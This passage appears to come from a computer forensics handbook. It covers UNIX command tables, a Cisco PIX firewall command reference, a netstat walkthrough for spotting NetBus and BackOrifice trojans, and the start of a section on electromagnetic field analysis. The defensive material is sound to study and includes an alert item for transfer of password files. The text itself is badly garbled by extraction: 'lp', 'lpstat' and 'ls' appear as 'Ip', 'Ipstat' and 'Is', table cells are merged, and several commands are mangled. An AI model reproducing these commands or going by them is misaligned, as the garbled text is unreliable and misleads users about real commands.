|   || Also moves files to other directories || mv **script.exe ~/ bin** || Moves the **script.exe** file to the **bin** directory that is in the home (~) parent directory *and* it keeps its initial name |
|   || Allows multiple moves || mv **script\_1 script.exe -/ bin** || Moves both **script\_l** and **scriptexe** to the **bin** directory |
| **Pwd** || Prints the current directory to the screen || pwd || May print something like “/home/bob” |
| pr *(option)* **filename** || Prints the specified file to the default printer*Note:* options are not required but can be combined in any order. || pr **userlist** || Prints the contents of **userlist** to the default printer |
|   ||   |
| pr + k **filename** || Starts printing with page k || pr +5 **userlist** || Prints the contents of **userlist** starting with page 5 |

| *UNIX Command* || *Explanation* || *Example* || *End Result* |
| --- | --- | --- | --- |
| pr -k **filename** || Prints in k columns || pr -2 **userlist** || Prints the contents of **userlist** in two columns |
| --- | --- | --- | --- |
| pr -a **filename** || Prints in multicolumns across the page (use with -k) || pr -3a **userlistl** || Prints **userlist** in three columns across the page |
| **pr -d filename** || Prints in double space format || pr -d **userlist** || Prints **userlist** with double space format |
| pr -h “header” **filename** || Prints the file with a specified header rather than the filename || pr -h “users” **userlist** || Prints **userlist** with *users* as the header |
| **Note:** Options can be combined using pr. |
| Ipconfig **printer\_jd queue** || Configures remote printers to a local || Ipconfig **prntr1 bobprt** || Configures a printer named **prntrl** to accept print requests from a local queue named bobprt |
| print queue |
| Ipconfig -r **queue** || Removes said queue from the local || Ipconfig -r **bobprt** || Removes **bobprt** queue from the local system if the person removing the queue is the owner or “root” |
| System |
| Ipconfig -d **queue** || Makes said queue the default queue || Ipconfig -d **vpprnt** || Makes **vpprnt** the default print queue |
| Ipstat (-*options)* || Prints printer status information to screen *(options not required)* || Ipstat || Prints status of all requests made to the default printer by the current server |
| **Ipstat-u”user1, user2”** || Prints the status of requests made by the specified users || Ipstat **\-**u**”bob”** || Prints status of all requests made by the user with the ID **bob** |
| Ipstat s || Prints the queues and the printers they print to || none || None |

| *Unix Commands* || *Concise Explanations* || *Examples* || *End Result* |
| --- | --- | --- | --- |
| Ipstat -t || Shows all print status information || none || None |
| --- | --- | --- | --- |
| Ipstat -d || Shows the default printer for the Ip command || none || None |
| Ipstat -r || Shows if the line printer scheduler is running || none || None |
| Ip *(-option)***file(s)** || Like pr, prints designated files on the connected printer(s) *(options not required and options may be combined)* || Ip **junkfile** || Prints the file **junkfile** to the default printer in default one-sided, single-sided, single-spaced format |
| Ip *\-*d*dest* **file(s)** || Prints the file(s) to a specific destination || Ip -dbobsq **zoom** || Sends the file **zoom** to the *bobsq* print queue to print |
| **Ip** *\-nnumber* **file(s)** || Allows user to designate the number of copies to be printed || Ip -n5 **crash** || Prints five copies of **crash** in default settings |
| Ip *\-*t*title* **file(s)** || Places *title* on the banner page || Ip *\-*t*Bobs* **cash** || Prints *Bobs* on the banner page of the file printout named **cash** |
| Ip *\-ooption* **file(s)** || Allows printer-specific options to be used (i.e., double-sided or two pages per side, etc.) || Ip -od **output** || Prints the **output** file double-sided on the printout |
|   ||   || Ip -obold **output**Ip -ohalf **output**Ip -oquarter **output** || Prints **output** in bold printDivides the paper into two halves for printing **output**Prints four pages of **output** per side of paper |
| *Note:* Options can be combined using Ip. || Ip -olandscape **output**Ip -oportrait **output** || Prints **output** in landscape orientationPrints **output** in portrait orientation |
| Cancel**requestjd** || Stops print jobs or removes them from the queue **(request\_jds** are obtained using Ipstat) || Cancel 5438 || Stops the print job with the id 5438 whether it is printing or if it is sitting in the queue |
| Cancel -a **printer** || Removes all print requests from the current user on the specified printer || Cancel -a **bobsprt** || Removes all the requests from the current user to the printer named **bobsprt** |
| *UNIX* *Command* || *Explanation* || *Example* || *End Result* |
| Cancel-u **login\_id** || Removes any print requests queued belonging to the user || Cancel -u **bob** || Cancels all queued print requests for user **bob** |
| Ps || Shows certain information about active processes associated with the current terminal || Ps || Shows a listing of process IDs, terminal identifier, cumulative execution time, and command name |
| Ps -e || Shows information about *all* processes || Ps -e || Shows a listing of process IDs, terminal identifiers, cumulative execution time, and command names for all processes |
| Ps -f || Shows a *full* listing of information about the processes listed || Ps -f || Shows UID (user or owner of the process), PID (process ID, use this number to kill it), PPID (process ID of the parent source), C (processor utilization for scheduling), STIME (start time of the process), TTY (controlling terminal for the process), TIME (cumulative time the process has run), and COMMAND (the command that started the process) |
| Ps -u **user\_id** || Shows all processes that are owned by the person with the pertinent userjd || Ps -u **bob** || Shows all the processes that belong to the person with the userid **bob** |
| Ps -ef || Shows all processes in a full listing || Ps -ef || Shows all current processes in full listing |
| Kill **process\_jd** || Stops the process with the said **id** || Kill **6969** || Kills the process with PID **6969** |
| Kill -9 **processjd** || Destroys the process with the said **id** || Kill **\-9 6969** || PID **6969** does not have a chance here |
| Grep -c **string file** || Searches input file(s) for specified string and prints the line with matches || Grep **mike letter** || Searches for the string mike in the file named **letter** and prints any line with **mike** in it to the screen |
| Grep -c **string file** || Searches and prints only the number of matches to the screen || Grep -c **hayes****bankletter** || Searches the file **bankletter** for the string **hayes** and prints the number of matches to the screen |
| Grep -i **string file** || Searches without regard to letter case || Grep -i **hi file1** || Searches **file1** for **hi, HI, hl,** and **HI** and prints all matches to the screen |
| Grep -n **string file** || Prints to the screen preceded by the line number || Grep -n **abc alpha** || Searches **alpha** for **abc** and prints the lines that match and line numbers to the screen |
| Grep -v **string file** || All lines that do not match are printed || Grep -v **lead pencils** || Prints all lines in **pencils** that *do not* contain the string **lead** |
| Grep -x **string file** || Only exact matches are printed || Grep -x **time meetings** || Prints only lines in **meetings** that match **time** exactly |
|   || grep is useful when used in a | “pipe” || Ps -ef | grep**bob** || Finds all processes in full listing and then prints only the ones that match the string **bob** to the screen |
|   || Can also redirect its output to a file || Grep -i **jan b\_days>mymo nth** || Searches the file **b\_days** for case insensitive matches to **jan** and places the matching lines into a file called **mymonth** |
|   ||   ||   ||   |
| *Command* || *Description* || *Example* || *Explanation* |
| Vuepad **filename** || Opens **filename** for editing/viewing in the vuepad editor || None || None |
| Vi **filename** || Text editor that exists on every UNIX system in the world || None || None |
| Emacs **filename** || Another text editor || None || None |
| Compress **filename** || Compresses the file to save disk space || None || None |
| Uncompress **filename**Awk || Expands a compressed fileUNIX programming language || NoneNone || NoneNone |
| *Command* || *Description* || *Example* || *Explanation* |
| Eval “resize” || Tells the target computer that the window has been resized during telnet || None || None |
| Chexp # || Keeps the file(s) from expiring (being erased) on the target computer for # days || Chexp || Keeps the target computer from deleting all files starting with **nr** for 1 year (365 days) |
| **Filename** || 365 **nr\*** |
|   || Chexp 4095 **nr\*** || Makes all files whose name starts with **nr** never expire or be deleted (infinite) |
|   ||   |
| Qstat || Displays the status of a process that has been submitted the NetworkQueuing System (basically a batch job) || Qstat || Shows the status of the requests submitted by the invoker of the command - will print request-name, request-id, the owner, relative request priority, and request state (is it running yet?) |
|   ||   |
|   ||   |
|   ||   |
|   ||   || Qstat -aQstat -1Qstat -mQstat -u **bob**Qstat -x || Shows all requestsShows requests in long formatShows requests in medium-length formatShows only requests belonging to the user **bob**Queue header is shown in an extended Format |
|   ||   ||   ||   |

| *Command* || *Description* || *Example* || *Explanation* |
| --- | --- | --- | --- |
| Xterm || Opens a new window || Xterm || This opens another window like the |
| --- | --- | --- | --- |
|   || (x-terminal) for you to work ||   || one you are currently working in. |
| Xterm -option || \-option sets the option ||   ||   |
| Xterm +option || +option resets the option to default ||   ||   |
| **Note:** Using xterm will eliminate desktop clutter. 1 strongly recommend learning to use it in your scripts. |
| Xterm -help || Displays the xterm options || Xterm -help || Shows the options available |
| Xterm -e**program** || Executes the listed program in the new xterm window; when the program is finished, the new xterm window goes away || Xterm -e || Opens an xterm window and executes the program **myprog.exe** from that window so that you may still work in your present window |
| **myprog.exe** |
|   ||   |
|   ||   |
| Xterm -sb || Opens an xterm that saves a set number of lines when they go off the top of the page and makes them accessible with a scroll bar || Xterm -sb || Puts a scroll bar on the right side of the page for reviewing past lines in the window |
|   ||   |
|   ||   |
| **Note:** When clicking in the scroll bar, the left button scrolls down, the right scrolls up, and the middle snaps the scroll bar to the mouse position for dragging up and down |
| Xterm -sI || Specifies the **number** of lines to be saved once they go off the top of the screen (default is 64) || Xterm -sI **1000** || Xterm will save **1000** lines of work once it has moved off the immediate viewing area; it can be accessed using the scroll bar |
| **Number** ||   |
|   ||   |
| Xterm -geom || Option allows you to specify the size **x pixels** by **y pixels** and placement **position x** by **position y** of the new window when it opens || xterm -geom || First command will open a window 80 pixels wide by 80 pixels tall and position its top left-hand corner at 0 pixels to the right of the left edge and 50 pixels down from the top of the screen |
| **xxy + px + py** || **80 × 80 + 0 + 50** |
|   ||   |
|   ||   |
|   || Position +0+0 is the top left-hand ||   |
|   || corner of the screen; and the bottom right is approx. + 1200 + 1000 depending on the resolution ||   |
| **Note:** The size of the window takes precedence over position, so if you position it too close to the side of the screen, it will position at the edge with the correct size |
|   ||   || xterm -geom || Second command will open a window |
|   ||   || **10 × 35 + 300 + 5** || **10** pixels wide by **35** pixels tall and position its top left-hand corner **300** pixs from the left edge and **500** pixs down from the top |
|   ||   || **00** |
|   ||   || Xterm -geom || The third command will make a 5 by 5 |
|   ||   || **5 × 5 + 0 + 0** || window and position its top left-hand corner at the top left-hand corner of the screen |
|   ||   ||   || Xterm will not compromise size when positioning |
|   ||   ||   |
| Xterm -title **Label** || Allows you to label your window’s top title bar || Xterm -title **SCRIPTS** || Opens an xterm window with the title **SCRIPTS** (default is whatever follows the -e option) |
| Xterm -(areas) **Color** || Allows you to modify different colors in your xterm window || Xterm -bg **white** || First command sets the background color to **white** |

| *Command* || *Description* || *Example* || *Explanation* |
| --- | --- | --- | --- |
| Xterm -fn **font** || Sets the font in the new xterm window || Xterm -bd**huntergreen**Xterm -fg **red**Xterm -fn**courr18**Xterm -iconic –title **xyz** || Second command sets the window border color to **huntergreen**The third command window sets the text color to **red**Sets the font to **courrl8** (default is *fixed)*Opens an xterm in iconic form with the title **xyz** |
| --- | --- | --- | --- |
| Xterm -iconic Starts the new xterm as an icon (double-click to maximize)**Note:** Options can be combined using xterm ||   ||   |

| *Command* || *Description* |
| --- | --- |
| Alias dir Is || Enables typing of either dir or Is to obtain a directory listing. (Note: I can substitute any word in place of “dir.” I can even use the word “mouse.” Therefore, now when I type the word “mouse” at the command line, it would do what the command “Is” would normally do.)Displays all defined aliases.Now dir will no longer work as a command to be used in place of Is.Now I only have to type “h” instead of the entire command “history.” The “history” command gives a list of the commands that have been typed on the system (a certain number of them, depending on how “history” was configured).Backs up the current directory (.) and stores the resulting archive on the diskette in a: |
| --- | --- |
| Alias |
| Unalias dir alias h history |
| Tar -cvf a:archive |
| Tar -cvf a:archive \*.doc || Backs up every file with the.doc suffix |
| Tar -cvf aiarchive - || Used when you want to type filenames from the keyboard (standard input). Type each filename on a separate line. ^Z indicates end of list |
| Tar -tf a:archive | more || Produces a list of all files currently contained in the archive |
| Find/-ctime -7 > weeklist || Identify any files that have changed in the last 7 days. Place these filenames in weeklist |
| Tar -cvf a:archive - < weeklist || Backup all files in weeklist. |
| Find/-ctime -7 | tar -cvf a:archive - || Does the same thing that the above two commands do, but does it using a pipe (the | symbol) |
| Df || Disk space usage on a file system |
| Du || Disk space used by a directory |
| Grep -i ‘^Aftp’/etc/inetd.conf || Check to see if you are running ftp services: |
| Find/-name ‘\*s’ -print || Begins the search at the root directory (/) and look for anything (\*) ending with and s and print it to the screen |
| Find/-name core -atime +7 -exec rm -f {}|; || Finds all core files more than 7 days since last access and removes them. Core files are important since they contain information relating to the failure of a system or an application running on that system |
| Find/-ctime -2 -print || Returns all the files that have been changed fewer than 2 days ago |

 
| Find/users/jake -exec chown jake {} \\; || Makes the user jake the owner of the directory/users/jake and everything underneath itFinds file owned by a user not listed in /etc/groupFinds files owned by a user not listed in /etc/passwdExamines disks to ensure consistency of the information they contain. Checks all file systems listed in /etc/fstab.0 = successfulfsck -p /dev/rra1h (in rc.boot)BSD: /etc/fstab /etc/filesystems in some flavorsATT: /etc/checklistFile Transfer Protocol: used to open communications to another computer system. Allows transfer of files to/from that system. Use as follows (type the words in italics):*ftp* cthen press the enter key>ftp> *open*(to) *TMG1* cnote that TMG1 is the name of the system you want to open communications with>Name: *Brucel* <Bruce1 is your userID on TMG1>Password: *tsili73m*230 User Brucel Logged Inftp> |
| --- | --- |
| Find/-nogroup -print ||   |
| Find/-nouser -print ||   |
| Fsck ||   |
| ftp ||   |

# Appendix ECisco firewall commands

Currently, firewalls are the primary devices used to protect the outside perimeter of a corporate, military, or government network infrastructure. Properly configured, a firewall can be very useful in preventing malicious users on the public Internet from accessing private data, even when the organization has a connection to the Internet. Cisco is a major supplier of Internet infrastructure devices, such as routers, firewalls, and virtual private networks (VPNs). Because most networks encountered will have a firewall, and because Cisco is a major supplier of network infrastructure components, the commands used on a Cisco PIX firewall will be covered.

## PIX command reference

“Help” information is available by entering a question mark by itself for a listing of all commands or with a “command space ?”.

You can add comments to your configuration by entering a colon as the first command in a line. Use comments to improve configuration file readability or to make configuration file commands not executable.

**Note:** cm = configuration mode, pm = privileged mode, and um = unprivileged mode.

 
| age 15 || Set private link key duration to 15 minutes.cm. |
| --- | --- |
| apply || Apply outbound access list to an IP address, cm. Use outbound lists to permit or deny access to system ports. |
| arp || cm. Add entry to pix firewall arp table, arp is a low-level tcp/IP protocol that resolves a node’s physical address from its IP address. |
| arp timeout 42 || cm. Change pix arp table entry duration, arp entry can exist in the arp table 42 seconds before being cleared. Default is 4 hours. |
| auth || Enable pix user authentication, cm. 5 chances to log in. |
| auth-server || Specify the IP address of the authentication server.cm. |
| auth-user || Specify IP address of authentication user. cm. Lets you provide authentication services for an IP address. |
| clear apply || cm. Clear previous apply of outbound access lists to an IP address. |
| clear arp || pm. Clear pix arp table entry. Can clear by MAC or IP address. |
| clear auth-user || cm. Remove authentication access for an IP address. |
| clear auth-server || cm. Specifies that an authentication server is no longer servicing authentication requests. |
| clear http || cm. Removes http access to an IP address. |
| clear outbound || cm. Clears an outbound access list. |
| clear route || cm. Clear the inside or outside interface’s routing table. |
| clear snmp-server || cm. Clear snmp contact or location or stop sending snmp event data. |
| clear syslog || cm. Stop logging syslog messages. |
| clear telnet || cm. Remove pix telnet access from user. |
| conduit || cm. Add conduit through firewall for incoming connections. |
| configure floppy || pm. Merge current configuration with that on floppy disk. |
| configure memory || pm. Merge configuration with that from flash memory. |
| configure terminal || pm. Start configuration mode. |
| disable || pm. Exit privileged mode and return to unprivileged mode. |
| enable || um. Start privileged mode. |
| enable password || pm. Sets the privileged mode password. |
| failover || cm. Enable access to the optional failover feature. |
| global || cm. Define IP address in the global pool. |
| help || um. Display help information. |
| hostname || cm. Change the hostname in the pix command line prompt. |
| http || cm. Permit inside IP address access to the pix html management interface. |
| interface ethernet || cm. Identify ethernet board speed and duplex. |
| interface token || cm. Identify token ring board speed. |
| ip address || cm. Identify IP address for pix. |
| kill telnet\_id || pm. Terminates a telnet session. |
| link || cm. Specify private link connection to pix. |
| linkpath || cm. Define a private link destination IP address. |
| lnko || cm. Define access to an older version 2 private link pix. |
| lnkopath || cm. Specify a version 2 private link path to the remote pix. |
| nat || cm. Associate a network with a pool of IP addresses. |
| no apply || cm. Cancel a previous use of the apply command. |
| no arp || pm. Erases the contents of the pix arp table. |
| no auth || cm. Suspend user authentication services. |
| no auth-server || cm. Remove access to authentication server. |
| no auth-user || cm. Disable user authentication for IP address. |
| no conduit || cm. Remove a conduit. |
| no failover || cm. Turn failover off or force pix into standby mode. |
| no global || cm. Remove IP address from the global pool. |
| no http || cm. Remove IP address access to the pix html management interface. |
| no link || cm. Disable private link connection. |
| no linkpath || cm. Disable private link destination IP address. |
| no lnko || cm. Disable access to an older version 2 private link pix. |
| no lnkopath || cm. Disable a version 2 private link path to the remote pix firewall. |
| no nat || cm. Disassociate a network with a pool of IP addresses. |
| no outbound || cm. Removes the access list previously created with outbound. |
| no rip || cm. Disables rip updates. |
| no route || cm. Remove an entry from the routing table. |
| no snmp-server || cm. Stops the pix from sending snmp event information. |
| no static || cm. Disables a permanent mapping (static translation slot) between a local IP address and a global IP address in the virtual pool. |
| no syslog || cm. Stop logging syslog messages (console, host IP address, output facility level) |
| no telnet || pm. Disable IP address telnet access to the pix. |
| outbound || cm. Creates an access list that determines how inside IP addresses can access outside activities. |
| passwd || Set password for telnet and html access. 16 char max. not case sensitive. #. |
| ping || cm. Determine if other IP addresses are visible from the pix. |
| reload || pm. Reboots and reloads the configuration from flash memory. |
| rip || cm. Changes rip settings. |
| route || cm. Enter a static route for the specified interface. |
| show || Differs by mode. View command information (age, arp, auth, many others). |
| show actkey || um. Show activation key and number of user licenses. |
| show blocks || um. Show system buffer utilization. |
| show config || pm. View configuration in flash memory. |
| show hw || um. Display hardware identification values. |
| show interface || um. View network interface information. |
| show memory || um. Show system memory utilization. |
| show processes || um. Display running processes. |
| show version || um. View pix version. |
| show who || um. Show active http and telnet admin sessions on pix. |
| show xlate || um. Displays the contents of the translation slots. |
| snmp-server || cm. Provide snmp event information. |
| static || cm. Map local IP address to global IP address. |
| syslog console || cm. View syslog messages on the pix. |
| syslog host || cm. Define which hosts are sent syslog messages, syslog host ip\_address. |
| syslog output || cm. Start sending syslog notification messages. |
| telnet || pm. Allow inside IP address to configure the pix from telnet. |
| timeout || cm. Sets the maximum idle time for translation and connection slots. |
| who || um. Shows active telnet admin sessions on pix. |
| write erase || pm. Clear the contents of flash memory. |
| write floppy || pm. Store the current configuration on floppy disk. |
| write memory || pm. Save current configuration in flash memory. |
| write terminal || pm. View current configuration on console. |

Since firewalls are extremely important to the security of an organization’s network infrastructure, a few more key items will be provided to allow you to speak somewhat knowledgeably about firewalls.

*   Two major problems that occur with firewalls: misconfiguration and code vulnerabilities.
*   Four major items you want to see in a firewall: security, performance, speed, management (includes “ease of use”).
*   Before choosing a firewall, you need to assess potential risks and develop security policies.
*   Firewalls will not protect against: modems on corporate desktops.
*   Firewall architecture: Three basic approaches to access control: 
    1.  Packet filtering: Examines all the packets it sees and then forwards or drops them based on predefined rules.
    2.  Proxies: Acts as an intermediary for user requests, setting up a second connection to the desired resource either at the application layer (an application proxy) or at the session or transport layer (a circuit relay).
    3.  Stateful inspection: Examines the packets it sees like packet filters do, but goes a step further. It remembers which port numbers are used by which connections and shuts down access to those ports after the connection closes. Check point developed the stateful inspection architecture which gives the firewall the ability to safely transport virtually any application.
*   Executable content such as Java and ActiveX objects: One of the more frightening aspects of Internet and Intranet traffic. Executable content can ride right through many firewalls using services the device allows. A web surfer could download a page containing malicious ActiveX or Java objects. The firewall would let it right in because it has been configured to allow web access.
*   DMZ design: Adds an extra measure of protection for the internal network. Even if an attacker on the external segment manages to compromise machines on the DMZ, everything on the inside remains guarded by the firewall.
*   Log files get filled up: Best to shut down external access when this occurs. This is a safer course than overwriting old log entries or continuing to operate without logs.
*   Firewall alerts: Set up to do paging or e-mail alerts for unauthorized access attempts.
*   SYN flooding: Also known as Sync Storms; a denial-of-service attack; very serious to ISPs, bombarding the firewall with requests to synchronize TCP connections. The firewall allocates all available buffer space to these requests and thus cannot accept any for legitimate connections.
*   Java and ActiveX: Java is considered to be somewhat less risky than ActiveX since it has built-in security controls where ActiveX does not. Microsoft says the long-range answer for ActiveX security are digital signatures that vouch for the safety of each object. Net managers are better off screening the executable content their firewalls handle.
*   Configuration items for the firewall: 
    1.  a. Page or e-mail alert of unauthorized access attempt.
    2.  b. Remotely disable outside access (external interface).
    3.  c. Any product that permits remote configuration should authenticate and encrypt connections to the firewall.
    4.  d. Deny access from a given subnet.
    5.  e. Log blocked access attempts.
    6.  f. SYN flooding.
    7.  g. Ping of death.
    8.  h. Log full.
    9.  i. Disk full.
    10.  j. E-mail or paging alert for: 
         1.  i. Transfers of more than 20 MB.
         2.  ii. Any usage between 1 A.M. and 6 A.M. of more than 5 MB. More than 40 MB of traffic.
         3.  iii. Excessive number of connections requested per minute.
         4.  iv. More than 10 attempts per minute to nonexistent IP address.
         5.  v. IP spoofing attempt: An attack in which would-be intruders outside the firewall configure their machines with IP addresses on the inside.
         6.  vi. Transfer of the /etc/password or similar file.

# Appendix FDiscovering unauthorized access to your computer

Use the “netstat” command to determine whether or not there is an unauthorized connection to your workstation. As shown below, the /? parameter can be used to read the “Help” section of the “netstat” command.

netstat /? Displays protocol statistics and current TCP/IP network connections.

NETSTAT \[-a\] \[-e\] \[-n\] \[-s\] \[-p proto\] \[-r\] \[interval\]

 
| \-a || Displays all connections and listening ports. (Server-side connections are normally not shown.) |
| --- | --- |
| \-e || Displays Ethernet statistics. May be combined with the -s option. |
| \-n || Displays addresses and port numbers in numerical form. |
| \-p || Shows connections for the protocol specified by proto; proto may be TCP or UDP. If used with the -s option to display per-protocol statistics, proto may be TCP, UDP, or IP. |
| \-r || Displays the contents of the routing table. |
| \-s || Displays per-protocol statistics. By default, statistics are shown for TCP, UDP and IP; the -p option may be used to specify a subset of the default. |
| interval || Redisplays selected statistics, pausing interval seconds between each display. Press CTRL+C to stop redisplaying statistics. If omitted, netstat will print the current configuration information once. |

“netstat -a” shows the list of ports on your machine. NetBus will be listening at port 12345; BackOrifice will be listening at port 31337. These port numbers can be changed by the attacker, but most attackers are either too lazy or do not know how to make the change. Normal ports you should expect to see are 135, 137 (nbname), 138 (nbdata- gram), and 139 (nbsession). You should also see a few ports starting at 1024 through around 1030. These are most likely fine. In this list, you will also see whom your machine is connected to. If the attacker is using BackOrifice, you will not see a connection (it uses UDP, which is “connection-less”), but if NetBus is being used, you will see the attacker’s name appear.

Type netstat -an and look for anything with port 1025. Now close another program and look again. If after closing all visible programs, the port stays open, hit control + alt + delete once and exit everything but Explorer and systray. If that port is still open, there may be a trojan horse running; telnet to localhost 1025 and see if it gives you any of the common trojan banners.

A “netstat -a |more” would also be useful to find out if there are any trojan ports listening. I will use my workstation as an example:

C: \\WINDOWS>netstat -a

Active Connections

 
| *Proto* || *Local Address* || *Foreign Address* || *State* |
| --- | --- | --- | --- |
| TCP || bmiddletonpc:1025 || 0.0.0.0:0 || LISTENING |
| --- | --- | --- | --- |
| TCP || bmiddletonpc:1033 || 0.0.0.0:0 || LISTENING |
| TCP || bmiddletonpc:1034 || 0.0.0.0:0 || LISTENING |
| TCP || bmiddletonpc:1058 || 0.0.0.0:0 || LISTENING |
| TCP || bmiddletonpc:1059 || 0.0.0.0:0 || LISTENING |
| TCP || bmiddletonpc:1064 || 0.0.0.0:0 || LISTENING |
| TCP || bmiddletonpc:1065 || 0.0.0.0:0 || LISTENING |
| TCP || bmiddletonpc:1066 || 0.0.0.0:0 || LISTENING |
| TCP || bmiddletonpc:1033 || wolf.ipq.com:1352 || ESTABLISHE |
| TCP || bmiddletonpc:1034 || maiI1.ipq.com:1352 || ESTABLISHE |
| TCP || bmiddletonpc:1058 || web1.ipq.com:80 || CLOSE\_WAI |
| TCP || bmiddletonpc:1059 || web1.ipq.com:80 || CLOSE\_WAI |
| TCP || bmiddletonpc:1069 || mail1.ipq.com:1352 || TIME\_WAIT |
| TCP || bmiddletonpc:427 || 0.0.0.0:0 || LISTENING |
| TCP || bmiddletonpc:3017 || 0.0.0.0:0 || LISTENING |
| UDP || bmiddletonpc:427 || \*:\* ||   |

C:\\WINDOWS>netstat -an

Active Connections

 
| *Proto* || *Local Address* || *Foreign Address* || *State* |
| --- | --- | --- | --- |
| TCP || 0.0.0.0:1025 || 0.0.0.0:0 || LISTENING |
| --- | --- | --- | --- |
| TCP || 0.0.0.0:1033 || 0.0.0.0:0 || LISTENING |
| TCP || 0.0.0.0:1034 || 0.0.0.0:0 || LISTENING |
| TCP || 0.0.0.0:1058 || 0.0.0.0:0 || LISTENING |
| TCP || 0.0.0.0:1059 || 0.0.0.0:0 || LISTENING |
| TCP || 0.0.0.0:1064 || 0.0.0.0:0 || LISTENING |
| TCP || 0.0.0.0:1065 || 0.0.0.0:0 || LISTENING |
| TCP || 0.0.0.0:1066 || 0.0.0.0:0 || LISTENING |
| TCP || 157.43.232.249:1033 || 157.43.177.41:1352 || CLOSE\_WAIT |
| TCP || 157.43.232.249:1034 || 157.43.177.51:1352 || ESTABLISHED |
| TCP || 157.43.232.249:1058 || 157.43.52.121:80 || CLOSE\_WAIT |
| TCP || 157.43.232.249:1059 || 157.43.52.121:80 || CLOSE\_WAIT |
| TCP || 157.43.232.249:1088 || 157.43.177.51:1352 || TIME\_WAIT |
| TCP || 157.43.232.249:427 || 0.0.0.0:0 || LISTENING |
| TCP || 157.43.232.249:3017 || 0.0.0.0:0 || LISTENING |
| UDP || 157.43.232.249:427 || \*:\* ||   |

When I exit Netscape, I have (from netstat -an):

Active Connections

 
| *Proto* || *Local Address* || *Foreign Address* || *State* |
| --- | --- | --- | --- |
| TCP || 0.0.0.0:1025 || 0.0.0.0:0 || LISTENING |
| --- | --- | --- | --- |
| TCP || 0.0.0.0:1033 || 0.0.0.0:0 || LISTENING |
| TCP || 0.0.0.0:1034 || 0.0.0.0:0 || LISTENING |
| TCP || 157.43.232.249:1033 || 157.43.177.41:1352 || CLOSE\_WAIT |
| TCP || 157.43.232.249:1034 || 157.43.177.51:1352 || ESTABLISHED |
| TCP || 157.43.232.249:427 || 0.0.0.0:0 || LISTENING |
| TCP || 157.43.232.249:3017 || 0.0.0.0:0 || LISTENING |
| UDP || 157.43.232.249:427 || \*:\* ||   |

When I exit Lotus Notes, I have:

C:\\WINDOWS>netstat -an

Active Connections

 
| *Proto* || *Local Address* || *Foreign Address* || *State* |
| --- | --- | --- | --- |
| TCP || 0.0.0.0:1025 || 0.0.0.0:0 || LISTENING |
| --- | --- | --- | --- |
| TCP || 157.43.232.249:1034 || 157.43.177.51:1352 || TIME\_WAIT |
| TCP || 157.43.232.249:1089 || 157.43.177.41:1352 || TIME.WAIT*\*\*Note:* This is new.\*\* |
| TCP || 157.43.232.249:427 || 0.0.0.0:0 || LISTENING |
| TCP || 157.43.232.249:3017 || 0.0.0.0:0 || LISTENING |
| UDP || 157.43.232.249:427 || \*:\* ||   |

After waiting a few minutes, and with only Microsoft Word and DOS open, I have:

C:\\WINDOWS>netstat –an

Active Connections

 
| *Proto* || *Local Address* || *Foreign Address* || *State* |
| --- | --- | --- | --- |
| TCP || 0.0.0.0:1025 || 0.0.0.0:0 || LISTENING |
| --- | --- | --- | --- |
| TCP || 157.43.232.249:427 || 0.0.0.0:0 || LISTENING |
| TCP || 157.43.232.249:3017 || 0.0.0.0:0 || LISTENING |
| UDP || 157.43.232.249:427 || \*:\* ||   |

When I do a ctrl-alt-del and delete DPMW32, 3017 leaves. The others stay, even when I eliminate everything except systray and Explorer.

C: \\WINDOWS>netstat -an

Active Connections

 
| *Proto* || *Local Address* || *Foreign Address* || *State* |
| --- | --- | --- | --- |
| TCP || 0.0.0.0:1025 || 0.0.0.0:0 || LISTENING |
| --- | --- | --- | --- |
| TCP || 157.43.232.249:427 || 0.0.0.0:0 || LISTENING |
| UDP || 157.43.232.249:427 || \*.\* ||   |

C:\\WTNDOWS>telnet 157.43.232.249:1025

C:\\WINDOWS>telnet 157.43.232.249

C: \\WINDO WS>telnet 157.43.232.249:427

I am unable to telnet to any of these, so it does not appear that a trojan horse is on my system.

(netstat -a 20 > c:\\anyfilename) is memory intensive and will produce a large file if it is run all day. However, at the end of the day, open the file and search for 31337 or 12345. The IP address next to it is the IP of your attacker.

 
| For networking information, use the following commands: || finger |
| --- | --- |
|   || systat |
|   || netstat |
|   || lanscan |
|   || ifconfig |
| To list all routes use: || netstat -rn |
| If you want to compare old and new use: || netstat -r |
|   || netstat -m |
| Don’t forget that you can also use: || netstat /all |

It is best to experiment with netstat on your own machine to become familiar with its various parameters before using it during the course of investigations on others’ systems.

# Appendix GElectromagnetic field analysis (EFA)

Electromagnetic field analysis (EFA) is usually rich with differential equations (and the integral form of equations also) but I am going to attempt to leave those out. If I find that I need to include them, I will. I also want to emphasize that I am not going to lay out for you step by step how to take advantage of electromagnetic fields and utilize EFA. If you have the knowledge required to “read between the lines,” then what I provide here will be just what you are looking for. If you do not have that detailed knowledge then you will have to do a considerable amount of research. I suppose you could consider this a challenge and move forward from there.

Electromagnetic fields are composed of charges, at rest and in motion, that produce currents and electric-magnetic fields. Sound familiar? It should, because this is the “stuff” that allows electronic communication devices (e.g., computers, monitors, satellites, network appliances, antennas, microwave circuits, radio frequency \[RF\] and optical components, radar, etc.) to work in the first place. Impressed magnetic and electric current densities can be considered as energy sources, and where there is energy (with regards to communications devices, of which the computer is one), data is likely also present.

Materials hold charged particles and when these materials are subjected to electromagnetic fields, their charged particles intermingle with the electromagnetic field vectors, generating currents and changing the electromagnetic wave propagation in these media compared to that in free space. This is a key statement from a forensics perspective. We are looking for anomalies – something out of the ordinary – and this is a great place to begin.

In general, materials are differentiated as dielectrics (insulators), magnetics, or conductors depending on whether polarization (electric displacement current density), magnetization (magnetic displacement current density), or conduction (conduction current density) is the prime occurrence. A separate class of material is composed of semiconductors, which join the breach between dielectrics and conductors where neither displacement nor conduction currents are prime. Crystals (whether grown or synthetic) are a form of anisotropic material, and they are key elements of our electronic communication devices when it comes to determining the frequency of operation. Materials whose constitutive factors are functions of frequency are known as dispersive. All materials employed in our daily life display some amount of dispersion although the dissimilarities for some may be insignificant and for others much more noteworthy.

